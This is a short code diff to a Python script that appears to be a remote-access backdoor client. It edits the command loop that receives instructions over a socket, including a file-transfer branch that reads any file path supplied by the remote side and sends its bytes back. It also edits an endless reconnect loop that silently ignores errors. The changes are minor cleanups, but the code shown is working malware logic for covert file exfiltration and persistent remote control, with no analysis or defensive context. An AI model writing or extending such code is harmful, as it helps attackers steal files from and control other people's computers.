@@ -55,12 +55,11 @@ def deptor(s):
             sender(s,currentWD)
             continue
         elif data.decode() == 'exitu':
-            quit()
+            sys.exit(1)
         elif data.decode() == 'filetransferfromu12344':# For file transfer
             path = receiver(s)
             file = open(path,"rb")
             arr = file.read()
-            print(str(len(arr)).encode())
             s.send(str(len(arr)).encode())
             time.sleep(0.2)
             s.send(arr)
@@ -99,5 +98,5 @@ def security(s):
 while True:
     try:
         create_socket()
-    except:
+    except Exception as msf:
         pass
